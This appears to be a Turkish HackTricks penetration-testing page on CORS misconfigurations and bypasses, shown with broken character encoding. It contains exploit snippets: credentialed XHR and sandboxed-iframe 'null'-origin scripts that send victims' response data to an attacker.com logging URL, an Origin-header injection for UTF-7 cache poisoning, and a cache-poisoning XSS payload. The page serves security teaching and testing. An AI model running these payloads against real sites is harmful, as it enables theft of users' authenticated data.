# CORS - YanlÄ±ÅŸ YapÄ±landÄ±rmalar ve Atlama

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## CORS Nedir?

Cross-Origin Resource Sharing (CORS) standardÄ±, **sunucularÄ±n varlÄ±klarÄ±na kimin eriÅŸebileceÄŸini** ve **harici kaynaklardan hangi HTTP istek yÃ¶ntemlerinin izinli olduÄŸunu** tanÄ±mlamasÄ±na olanak saÄŸlar.

**AynÄ± kÃ¶ken** politikasÄ±, bir **kaynaÄŸa istek yapan** sunucu ve **kaynaÄŸÄ± barÄ±ndÄ±ran** sunucunun aynÄ± protokolÃ¼ (Ã¶r. `http://`), alan adÄ±nÄ± (Ã¶r. `internal-web.com`) ve **portu** (Ã¶r. 80) paylaÅŸmasÄ± gerektiÄŸini zorunlu kÄ±lar. Bu politika altÄ±nda, yalnÄ±zca aynÄ± etki alanÄ± ve porttan gelen web sayfalarÄ± kaynaklara eriÅŸime izinlidir.

`http://normal-website.com/example/example.html` baÄŸlamÄ±nda aynÄ± kÃ¶ken politikasÄ±nÄ±n uygulanmasÄ± aÅŸaÄŸÄ±daki gibi gÃ¶sterilir:

| EriÅŸilen URL                              | EriÅŸime izin verildi mi?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Evet: AynÄ± ÅŸema, etki alanÄ± ve port |
| `http://normal-website.com/example2/`     | Evet: AynÄ± ÅŸema, etki alanÄ± ve port |
| `https://normal-website.com/example/`     | HayÄ±r: FarklÄ± ÅŸema ve port      |
| `http://en.normal-website.com/example/`   | HayÄ±r: FarklÄ± etki alanÄ±               |
| `http://www.normal-website.com/example/`  | HayÄ±r: FarklÄ± etki alanÄ±               |
| `http://normal-website.com:8080/example/` | HayÄ±r: FarklÄ± port*                |

*Internet Explorer, aynÄ± kÃ¶ken politikasÄ±nÄ± uygularken port numarasÄ±nÄ± dikkate almaz, bu nedenle bu eriÅŸime izin verir.

### `Access-Control-Allow-Origin` BaÅŸlÄ±ÄŸÄ±

Bu baÅŸlÄ±k **birden fazla kÃ¶k**, bir **`null`** deÄŸeri veya bir joker karakter **`*`** izin verebilir. Ancak, **hiÃ§bir tarayÄ±cÄ± birden fazla kÃ¶kÃ¼ desteklemez** ve joker karakter `*` kullanÄ±mÄ± **kÄ±sÄ±tlamalara** tabidir. (Joker karakter yalnÄ±zca tek baÅŸÄ±na kullanÄ±lmalÄ±dÄ±r ve `Access-Control-Allow-Credentials: true` ile birlikte kullanÄ±lmasÄ± izin verilmez.)

Bu baÅŸlÄ±k, tarayÄ±cÄ±nÄ±n otomatik olarak bir `Origin` baÅŸlÄ±ÄŸÄ± eklediÄŸi bir web sitesi tarafÄ±ndan baÅŸlatÄ±lan Ã§apraz etki alanÄ± kaynak isteÄŸine yanÄ±t olarak **bir sunucu tarafÄ±ndan verilir**.

### `Access-Control-Allow-Credentials` BaÅŸlÄ±ÄŸÄ±

VarsayÄ±lan olarak, Ã§apraz etki alanÄ± istekleri Ã§erezler veya Yetkilendirme baÅŸlÄ±ÄŸÄ± gibi kimlik bilgileri olmadan yapÄ±lÄ±r. Ancak, bir Ã§apraz etki alanÄ± sunucusu, yanÄ±tÄ±n okunmasÄ±na izin vermek iÃ§in kimlik bilgileri gÃ¶nderildiÄŸinde `Access-Control-Allow-Credentials` baÅŸlÄ±ÄŸÄ±nÄ± **`true`** olarak ayarlayabilir.

EÄŸer `true` olarak ayarlanÄ±rsa, tarayÄ±cÄ± kimlik bilgilerini (Ã§erezler, yetkilendirme baÅŸlÄ±klarÄ± veya TLS istemci sertifikalarÄ±) iletecektir.
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Ã–n uÃ§u isteÄŸi

### Ã‡apraz Alan Ä°letiÅŸiminde Ã–n UÃ§u Ä°steklerini Anlama

Belirli koÅŸullar altÄ±nda, Ã¶rneÄŸin **standart olmayan bir HTTP yÃ¶ntemi** (HEAD, GET, POST dÄ±ÅŸÄ±nda herhangi bir ÅŸey), yeni **baÅŸlÄ±klar** tanÄ±tma veya Ã¶zel bir **Content-Type baÅŸlÄ±k deÄŸeri** kullanma durumunda, bir Ã¶n uÃ§u isteÄŸi gerekebilir. Bu Ã¶n hazÄ±rlÄ±k isteÄŸi, **`OPTIONS`** yÃ¶ntemini kullanarak sunucuyu yaklaÅŸan Ã§apraz kaynak isteÄŸinin niyetleri hakkÄ±nda bilgilendirir, bunlar arasÄ±nda kullanmayÄ± planladÄ±ÄŸÄ± HTTP yÃ¶ntemleri ve baÅŸlÄ±klar bulunur.

**Ã‡apraz Kaynak Kaynak PaylaÅŸÄ±mÄ± (CORS)** protokolÃ¼, bu Ã¶n uÃ§u kontrolÃ¼nÃ¼ zorunlu kÄ±lar ve izin verilen yÃ¶ntemleri, baÅŸlÄ±klarÄ± ve kÃ¶kenin gÃ¼venilirliÄŸini doÄŸrulayarak istenen Ã§apraz kaynak iÅŸleminin uygulanabilirliÄŸini belirler. Bir Ã¶n uÃ§u isteÄŸi iÃ§in gereksinimleri atlatan koÅŸullar hakkÄ±nda ayrÄ±ntÄ±lÄ± bir anlayÄ±ÅŸ iÃ§in [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) tarafÄ±ndan saÄŸlanan kapsamlÄ± kÄ±lavuza baÅŸvurun.

Ã–nemli bir nokta olarak, **bir Ã¶n uÃ§u isteÄŸinin olmamasÄ±, yanÄ±tÄ±n yetkilendirme baÅŸlÄ±klarÄ±nÄ± taÅŸÄ±ma gerekliliÄŸini ortadan kaldÄ±rmaz**. Bu baÅŸlÄ±klar olmadan tarayÄ±cÄ±, Ã§apraz kaynak isteÄŸinden gelen yanÄ±tÄ± iÅŸleme yeteneÄŸinden yoksun kalÄ±r.

AÅŸaÄŸÄ±daki Ã¶rnekte, `PUT` yÃ¶ntemini kullanmayÄ± amaÃ§layan ve `Special-Request-Header` adÄ±nda Ã¶zel bir baÅŸlÄ±k iÃ§eren bir Ã¶n uÃ§u isteÄŸinin bir gÃ¶sterimi gÃ¶sterilmektedir:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
Sunucu, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi kabul edilen yÃ¶ntemleri, izin verilen kaynaÄŸÄ± ve diÄŸer CORS politika ayrÄ±ntÄ±larÄ±nÄ± belirten baÅŸlÄ±klar dÃ¶ndÃ¼rebilir:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- **`Access-Control-Allow-Headers`**: Bu baÅŸlÄ±k, gerÃ§ek istekte hangi baÅŸlÄ±klarÄ±n kullanÄ±labileceÄŸini belirtir. Sunucu, istemciden gelen isteklerde izin verilen baÅŸlÄ±klarÄ± belirtmek iÃ§in bunu ayarlar.
- **`Access-Control-Expose-Headers`**: Bu baÅŸlÄ±k aracÄ±lÄ±ÄŸÄ±yla sunucu, basit yanÄ±t baÅŸlÄ±klarÄ±nÄ±n yanÄ± sÄ±ra yanÄ±tÄ±n bir parÃ§asÄ± olarak hangi baÅŸlÄ±klarÄ±n aÃ§Ä±ÄŸa Ã§Ä±karÄ±labileceÄŸini istemciye bildirir.
- **`Access-Control-Max-Age`**: Bu baÅŸlÄ±k, Ã¶n uÃ§uÅŸ isteÄŸinin sonuÃ§larÄ±nÄ±n ne kadar sÃ¼reyle Ã¶nbelleÄŸe alÄ±nabileceÄŸini belirtir. Sunucu, Ã¶n uÃ§uÅŸ isteÄŸi tarafÄ±ndan dÃ¶ndÃ¼rÃ¼len bilgilerin ne kadar sÃ¼reyle yeniden kullanÄ±labileceÄŸini saniye cinsinden belirler.
- **`Access-Control-Request-Headers`**: Ã–n uÃ§uÅŸ isteklerinde kullanÄ±lan bu baÅŸlÄ±k, istemcinin gerÃ§ek istekte hangi HTTP baÅŸlÄ±klarÄ±nÄ± kullanmak istediÄŸini sunucuya bildirmek iÃ§in ayarlanÄ±r.
- **`Access-Control-Request-Method`**: Bu baÅŸlÄ±k da Ã¶n uÃ§uÅŸ isteklerinde kullanÄ±lÄ±r ve istemci tarafÄ±ndan gerÃ§ek istekte hangi HTTP yÃ¶nteminin kullanÄ±lacaÄŸÄ±nÄ± belirtmek iÃ§in ayarlanÄ±r.
- **`Origin`**: Bu baÅŸlÄ±k tarayÄ±cÄ± tarafÄ±ndan otomatik olarak ayarlanÄ±r ve Ã§apraz kaynak isteÄŸinin kÃ¶kenini belirtir. Sunucu, CORS politikasÄ±na dayanarak gelen isteÄŸin izin verilip verilmeyeceÄŸini deÄŸerlendirmek iÃ§in bunu kullanÄ±r.

UnutmayÄ±n ki genellikle (iÃ§erik tÃ¼rÃ¼ne ve ayarlanan baÅŸlÄ±klara baÄŸlÄ± olarak) **GET/POST isteÄŸinde Ã¶n uÃ§uÅŸ isteÄŸi gÃ¶nderilmez** (isteÄŸin **doÄŸrudan** gÃ¶nderilir), ancak yanÄ±tÄ±n baÅŸlÄ±klarÄ±nÄ±/gÃ¶vdesini eriÅŸmek istiyorsanÄ±z, buna izin veren bir _Access-Control-Allow-Origin_ baÅŸlÄ±ÄŸÄ± iÃ§ermelidir.\
**Bu nedenle, CORS CSRF'ye karÅŸÄ± koruma saÄŸlamaz (ancak yardÄ±mcÄ± olabilir).**

### **Yerel AÄŸ Ä°stekleri Ã–n UÃ§uÅŸ Ä°steÄŸi**

1. **`Access-Control-Request-Local-Network`**: Bu baÅŸlÄ±k, istemcinin isteÄŸinin yerel aÄŸ kaynaÄŸÄ±na yÃ¶nelik olduÄŸunu belirtmek iÃ§in istemcinin isteÄŸine dahil edilir. Bu, isteÄŸin yerel aÄŸdan kaynaklandÄ±ÄŸÄ±nÄ± sunucuya bildirmek iÃ§in bir iÅŸaret olarak hizmet eder.

2. **`Access-Control-Allow-Local-Network`**: Sunucular, bu baÅŸlÄ±ÄŸÄ± kullanarak yanÄ±t olarak talep edilen kaynaÄŸÄ±n yerel aÄŸ dÄ±ÅŸÄ±ndaki varlÄ±klarla paylaÅŸÄ±labileceÄŸini iletiÅŸim kurmak iÃ§in kullanÄ±r. Bu, farklÄ± aÄŸ sÄ±nÄ±rlarÄ± arasÄ±nda kaynaklarÄ±n kontrol edilmiÅŸ eriÅŸimini saÄŸlarken gÃ¼venlik protokollerini korurken kaynak paylaÅŸÄ±mÄ±na yeÅŸil Ä±ÅŸÄ±k yakar.

**Yerel aÄŸ isteÄŸine izin veren geÃ§erli bir yanÄ±tÄ±n**, yanÄ±tta ayrÄ±ca `Access-Controls-Allow-Local_network: true` baÅŸlÄ±ÄŸÄ±nÄ± iÃ§ermesi gerekmektedir:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Dikkat edilmesi gereken bir nokta, **0.0.0.0** IP adresinin localhost'a eriÅŸmek iÃ§in bu gereksinimleri **atlamak** iÃ§in kullanÄ±labileceÄŸidir, Ã§Ã¼nkÃ¼ bu IP adresi "yerel" olarak kabul edilmez.

AyrÄ±ca, yerel aÄŸ gereksinimlerini **atlamak** mÃ¼mkÃ¼ndÃ¼r, eÄŸer yerel bir uÃ§ noktanÄ±n **genel IP adresini** (Ã¶rneÄŸin yÃ¶nlendiricinin genel IP'si) kullanÄ±rsanÄ±z. Ã‡Ã¼nkÃ¼ birkaÃ§ durumda, **genel IP** eriÅŸiliyor olsa bile, eÄŸer **yerel aÄŸdan** eriÅŸiliyorsa, eriÅŸim izni verilecektir.


{% endhint %}

## SÃ¶mÃ¼rÃ¼lebilir yanlÄ±ÅŸ yapÄ±landÄ±rmalar

`Access-Control-Allow-Credentials` ayarÄ±nÄ±n **`true`** olarak ayarlanmasÄ±, Ã§oÄŸu **gerÃ§ek saldÄ±rÄ±** iÃ§in bir Ã¶nkoÅŸuldur. Bu ayar, tarayÄ±cÄ±nÄ±n kimlik bilgilerini gÃ¶ndermesine ve yanÄ±tÄ± okumasÄ±na izin verir, saldÄ±rÄ±nÄ±n etkinliÄŸini artÄ±rÄ±r. Bu olmadan, tarayÄ±cÄ±nÄ±n bir isteÄŸi kendisi yerine getirmesinin avantajÄ± azalÄ±r, Ã§Ã¼nkÃ¼ bir kullanÄ±cÄ±nÄ±n Ã§erezlerini kullanmak mÃ¼mkÃ¼n olmaz hale gelir.

### Ä°stisna: Kimlik DoÄŸrulama Olarak AÄŸ Konumu SÃ¶mÃ¼rÃ¼sÃ¼

KurbanÄ±n aÄŸ konumu, kimlik doÄŸrulama ÅŸeklinde kullanÄ±ldÄ±ÄŸÄ±nda bir istisna vardÄ±r. Bu, kurbanÄ±n tarayÄ±cÄ±sÄ±nÄ±n bir proxy olarak kullanÄ±lmasÄ±na olanak tanÄ±r, IP tabanlÄ± kimlik doÄŸrulamayÄ± atlayarak yerel aÄŸ uygulamalarÄ±na eriÅŸim saÄŸlar. Bu yÃ¶ntem, DNS rebinding ile benzer etkilere sahip olmasÄ±na raÄŸmen, daha kolay sÃ¶mÃ¼rÃ¼lebilir.

### `Access-Control-Allow-Origin` iÃ§inde `Origin`'in YansÄ±tÄ±lmasÄ±

`Origin` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerinin `Access-Control-Allow-Origin` iÃ§inde yansÄ±tÄ±ldÄ±ÄŸÄ± gerÃ§ek dÃ¼nya senaryosu, bu baÅŸlÄ±klarÄ±n birleÅŸtirilmesine yÃ¶nelik kÄ±sÄ±tlamalar nedeniyle teorik olarak olasÄ± deÄŸildir. Bununla birlikte, CORS'u birden Ã§ok URL iÃ§in etkinleÅŸtirmek isteyen geliÅŸtiriciler, `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nÄ± `Origin` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerini kopyalayarak dinamik olarak oluÅŸturabilir. Bu yaklaÅŸÄ±m, Ã¶zellikle saldÄ±rganÄ±n geÃ§erlilik mantÄ±ÄŸÄ±nÄ± aldatmak iÃ§in tasarlanmÄ±ÅŸ bir alan adÄ± kullandÄ±ÄŸÄ±nda, gÃ¼venlik aÃ§Ä±klarÄ±na neden olabilir.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` KÃ¶kenini SÃ¶mÃ¼rme

YÃ¶nlendirmeler veya yerel HTML dosyalarÄ± gibi durumlar iÃ§in belirtilen `null` kÃ¶keni, benzersiz bir konuma sahiptir. BazÄ± uygulamalar, yerel geliÅŸtirmeyi kolaylaÅŸtÄ±rmak iÃ§in bu kÃ¶keni beyaz listeye alÄ±rken, yanlÄ±ÅŸlÄ±kla herhangi bir web sitesinin bir sandboxed iframe aracÄ±lÄ±ÄŸÄ±yla `null` kÃ¶kenini taklit etmesine izin vererek CORS kÄ±sÄ±tlamalarÄ±nÄ± atlamasÄ±na neden olur.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### DÃ¼zenli Ä°fade Atlama Teknikleri

Bir alan adÄ± beyaz listesiyle karÅŸÄ±laÅŸÄ±ldÄ±ÄŸÄ±nda, saldÄ±rganÄ±n alan adÄ±nÄ± beyaz listelenmiÅŸ bir alan adÄ±na eklemek veya alt alan adÄ± ele geÃ§irme zafiyetlerinden yararlanmak gibi atlama fÄ±rsatlarÄ±nÄ± test etmek Ã¶nemlidir. AyrÄ±ca, alan adÄ± doÄŸrulamasÄ± iÃ§in kullanÄ±lan dÃ¼zenli ifadeler, alan adÄ± adlandÄ±rma kurallarÄ±ndaki ince ayrÄ±ntÄ±larÄ± gÃ¶z ardÄ± edebilir ve daha fazla atlama fÄ±rsatÄ± sunabilir.

### GeliÅŸmiÅŸ DÃ¼zenli Ä°fade AtlamalarÄ±

DÃ¼zenli ifade desenleri genellikle alfanÃ¼merik, nokta (.), ve tire (-) karakterlerine odaklanÄ±rken, diÄŸer olasÄ±lÄ±klarÄ± gÃ¶z ardÄ± eder. Ã–rneÄŸin, tarayÄ±cÄ±lar ve dÃ¼zenli ifade desenleri tarafÄ±ndan farklÄ± ÅŸekilde yorumlanan karakterleri iÃ§eren bir alan adÄ±, gÃ¼venlik kontrollerini atlatabilir. Safari, Chrome ve Firefox'un alt alan adlarÄ±ndaki alt Ã§izgi karakterlerini nasÄ±l iÅŸlediÄŸi, bu tÃ¼r farklÄ±lÄ±klarÄ±n etki alanÄ± doÄŸrulama mantÄ±ÄŸÄ±nÄ± atlamak iÃ§in nasÄ±l sÃ¶mÃ¼rÃ¼lebileceÄŸini gÃ¶sterir.

**Bu atlama kontrolÃ¼nÃ¼n daha fazla bilgi ve ayarlarÄ± iÃ§in:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **ve** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Bir alt alan iÃ§inde XSS'ten

GeliÅŸtiriciler, CORS sÃ¶mÃ¼rÃ¼sÃ¼ne karÅŸÄ± koruma saÄŸlamak iÃ§in bilgi talep etmeye izin verilen alan adlarÄ±nÄ± beyaz listeye alarak savunma mekanizmalarÄ± uygularlar. Ancak, bu Ã¶nlemlere raÄŸmen, sistem gÃ¼venliÄŸi tam anlamÄ±yla saÄŸlanamaz. Beyaz listelenmiÅŸ alan adlarÄ± iÃ§inde yalnÄ±zca bir adet bile zafiyete aÃ§Ä±k alt alanÄ±n bulunmasÄ±, XSS (Cross-Site Scripting) gibi diÄŸer zafiyetler aracÄ±lÄ±ÄŸÄ±yla CORS sÃ¶mÃ¼rÃ¼sÃ¼ne yol aÃ§abilir.

Ã–rneÄŸin, `requester.com` alan adÄ±nÄ±n, baÅŸka bir alan adÄ± olan `provider.com`'dan kaynaklara eriÅŸime izin verildiÄŸi senaryoyu dÃ¼ÅŸÃ¼nelim. Sunucu tarafÄ± yapÄ±landÄ±rmasÄ± aÅŸaÄŸÄ±daki gibi olabilir:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
Bu yapÄ±da, `requester.com` alt alan adlarÄ±nÄ±n hepsi eriÅŸime izin verilir. Ancak, bir alt alan adÄ±, Ã¶rneÄŸin `sub.requester.com`, XSS zafiyetiyle ele geÃ§irilirse, saldÄ±rgan bu zayÄ±flÄ±ÄŸÄ± kullanabilir. Ã–rneÄŸin, `sub.requester.com`'a eriÅŸimi olan bir saldÄ±rgan, XSS zafiyetini kullanarak CORS politikalarÄ±nÄ± atlayabilir ve `provider.com` Ã¼zerindeki kaynaklara kÃ¶tÃ¼ niyetli eriÅŸim saÄŸlayabilir.


### **Sunucu tarafÄ± Ã¶nbellek zehirlenmesi**

**[Bu araÅŸtÄ±rmadan](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

HTTP baÅŸlÄ±ÄŸÄ± enjeksiyonu yoluyla sunucu tarafÄ± Ã¶nbellek zehirlenmesini sÃ¶mÃ¼rerek, depolanan bir Cross-Site Scripting (XSS) zafiyeti oluÅŸturulabilir. Bu senaryo, bir uygulamanÄ±n `Origin` baÅŸlÄ±ÄŸÄ±nÄ± yasaklÄ± karakterlerden arÄ±ndÄ±rmamasÄ± durumunda ortaya Ã§Ä±kar ve Ã¶zellikle Internet Explorer ve Edge kullanÄ±cÄ±larÄ± iÃ§in bir zafiyet oluÅŸturur. Bu tarayÄ±cÄ±lar `\r` (0x0d) karakterini meÅŸru bir HTTP baÅŸlÄ±k sonlandÄ±rÄ±cÄ±sÄ± olarak kabul eder ve bu da HTTP baÅŸlÄ±ÄŸÄ± enjeksiyonu zafiyetlerine yol aÃ§ar.

AÅŸaÄŸÄ±daki istekte `Origin` baÅŸlÄ±ÄŸÄ± manipÃ¼le edildiÄŸi dÃ¼ÅŸÃ¼nÃ¼lsÃ¼n:
```text
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer ve Edge, yanÄ±tÄ± ÅŸu ÅŸekilde yorumlar:
```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Bu zafiyeti doÄŸrudan bir web tarayÄ±cÄ±sÄ±nÄ±n hatalÄ± bir baÅŸlÄ±k gÃ¶ndermesiyle sÃ¶mÃ¼rmek mÃ¼mkÃ¼n olmasa da, Burp Suite gibi araÃ§lar kullanÄ±larak elle oluÅŸturulmuÅŸ bir istek kullanÄ±labilir. Bu yÃ¶ntem, sunucu tarafÄ±nda yanlÄ±ÅŸlÄ±kla yanÄ±tÄ± kaydeden ve baÅŸkalarÄ±na sunan bir Ã¶nbelleÄŸe yol aÃ§abilir. OluÅŸturulan payload, sayfanÄ±n karakter setini UTF-7 olarak deÄŸiÅŸtirmeyi amaÃ§lar. UTF-7, belirli baÄŸlamlarda betik olarak yÃ¼rÃ¼tÃ¼lebilen karakterleri kodlama yeteneÄŸi nedeniyle XSS zafiyetleriyle sÄ±k sÄ±k iliÅŸkilendirilen bir karakter kodlamasÄ±dÄ±r.

Daha fazla bilgi iÃ§in depolanan XSS zafiyetleri hakkÄ±nda [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored) sayfasÄ±na bakÄ±n.

**Not**: Ã–zellikle sunucu tarafÄ± Ã¶nbellek zehirlenmesi yoluyla HTTP baÅŸlÄ±k enjeksiyonu zafiyetlerinin sÃ¶mÃ¼rÃ¼lmesi, HTTP baÅŸlÄ±klarÄ± dahil olmak Ã¼zere tÃ¼m kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan giriÅŸlerin doÄŸrulanmasÄ± ve temizlenmesinin kritik Ã¶nemini vurgular. Bu tÃ¼r zafiyetleri Ã¶nlemek iÃ§in her zaman giriÅŸ doÄŸrulamasÄ± iÃ§eren saÄŸlam bir gÃ¼venlik modeli kullanÄ±n.


### **Ä°stemci TarafÄ± Ã–nbellek Zehirlenmesi**

**[Bu araÅŸtÄ±rmadan](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

Bu senaryoda, uygun kodlama olmadan Ã¶zel bir HTTP baÅŸlÄ±ÄŸÄ±nÄ±n iÃ§eriÄŸini yansÄ±tan bir web sayfasÄ± Ã¶rneÄŸi gÃ¶zlemlenir. Ã–zellikle, web sayfasÄ±, yÃ¼klenirken JavaScript kodunu yÃ¼rÃ¼tmek iÃ§in tasarlanmÄ±ÅŸ bir SVG gÃ¶rÃ¼ntÃ¼ etiketi iÃ§eren `X-User-id` baÅŸlÄ±ÄŸÄ±nda bulunan iÃ§eriÄŸi geri yansÄ±tÄ±r.

Cross-Origin Resource Sharing (CORS) politikalarÄ±, Ã¶zel baÅŸlÄ±klarÄ±n gÃ¶nderilmesine izin verir. Ancak, CORS kÄ±sÄ±tlamalarÄ± nedeniyle yanÄ±tÄ±n tarayÄ±cÄ± tarafÄ±ndan doÄŸrudan iÅŸlenmemesi durumunda, bÃ¶yle bir enjeksiyonun kullanÄ±ÅŸlÄ±lÄ±ÄŸÄ± sÄ±nÄ±rlÄ± gibi gÃ¶rÃ¼nebilir. Kritik nokta, tarayÄ±cÄ±nÄ±n Ã¶nbellek davranÄ±ÅŸÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼rken ortaya Ã§Ä±kar. EÄŸer `Vary: Origin` baÅŸlÄ±ÄŸÄ± belirtilmezse, kÃ¶tÃ¼ niyetli yanÄ±tÄ±n tarayÄ±cÄ± tarafÄ±ndan Ã¶nbelleÄŸe alÄ±nmasÄ± mÃ¼mkÃ¼n hale gelir. SonuÃ§ olarak, bu Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ yanÄ±t, URL'ye yÃ¶nlendirildiÄŸinde doÄŸrudan render edilebilir, baÅŸlangÄ±Ã§ isteÄŸi Ã¼zerinde doÄŸrudan render gereksinimini atlayarak. Bu mekanizma, istemci tarafÄ± Ã¶nbelleÄŸini kullanarak saldÄ±rÄ±nÄ±n gÃ¼venilirliÄŸini artÄ±rÄ±r.

Bu saldÄ±rÄ±yÄ± gÃ¶stermek iÃ§in, bir JSFiddle gibi bir web sayfasÄ±nÄ±n ortamÄ±nda yÃ¼rÃ¼tÃ¼lecek ÅŸekilde tasarlanmÄ±ÅŸ bir JavaScript Ã¶rneÄŸi sunulur. Bu betik basit bir eylem gerÃ§ekleÅŸtirir: belirtilen URL'ye, kÃ¶tÃ¼ niyetli JavaScript iÃ§eren Ã¶zel bir baÅŸlÄ±k iÃ§eren bir istek gÃ¶nderir. BaÅŸarÄ±lÄ± istek tamamlanmasÄ±nÄ±n ardÄ±ndan, hedef URL'ye yÃ¶nlendirmeye Ã§alÄ±ÅŸÄ±r ve yanÄ±t, `Vary: Origin` baÅŸlÄ±ÄŸÄ±nÄ±n uygun ÅŸekilde iÅŸlenmeden Ã¶nbelleÄŸe alÄ±ndÄ±ysa enjekte edilen betiÄŸin yÃ¼rÃ¼tÃ¼lmesini tetikleyebilir.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan JavaScript'in Ã¶zetlenmiÅŸ bir aÃ§Ä±klamasÄ± aÅŸaÄŸÄ±da verilmiÅŸtir:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Atlatma

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, aynÄ± kÃ¶ken politikasÄ±nÄ±n (SOP) betik etiketi kullanÄ±larak kaynaklar dahil edildiÄŸinde uygulanmadÄ±ÄŸÄ±ndan yararlanan bir gÃ¼venlik aÃ§Ä±ÄŸÄ± tÃ¼rÃ¼dÃ¼r. Bu, betiklerin farklÄ± alanlardan dahil edilebilmesi gerektiÄŸi iÃ§in geÃ§erlidir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, bir saldÄ±rganÄ±n betik etiketi kullanÄ±larak dahil edilen herhangi bir iÃ§eriÄŸe eriÅŸim saÄŸlamasÄ±na ve okumasÄ±na olanak tanÄ±r.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, Ã¶zellikle dinamik JavaScript veya JSONP (Padding ile JSON) gibi durumlarda Ã¶nem kazanÄ±r, Ã¶zellikle Ã§erezler gibi ortam yetkisi bilgileri kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±ldÄ±ÄŸÄ±nda. FarklÄ± bir sunucudan bir kaynak istendiÄŸinde, Ã§erezler dahil edilir ve saldÄ±rgan tarafÄ±ndan eriÅŸilebilir hale gelir.

